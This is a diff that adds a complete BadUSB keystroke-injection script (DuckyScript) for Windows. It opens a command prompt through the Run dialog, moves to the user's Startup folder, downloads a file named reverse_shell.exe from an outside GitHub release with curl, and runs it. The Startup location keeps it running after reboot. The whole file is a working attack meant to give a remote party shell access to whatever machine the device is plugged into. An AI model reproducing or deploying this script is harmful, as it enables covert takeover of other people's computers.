@@ -1,0 +1,23 @@
+DELAY 500
+REM Open Run dialog
+GUI r
+DELAY 500
+REM Open Command Prompt
+STRING cmd
+ENTER
+DELAY 1000
+REM Navigate to the Startup directory
+STRING cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+ENTER
+DELAY 500
+REM Download the file using curl
+STRING curl -L "https://github.com/hunter1300fc/WIN_Reverse_Shell/releases/download/badusb/reverse_shell.exe" -o "rev_shell.exe"
+ENTER
+DELAY 3000
+REM Execute the downloaded file
+STRING rev_shell.exe
+ENTER
+DELAY 1000
+REM Close the Command Prompt
+STRING exit
+ENTER
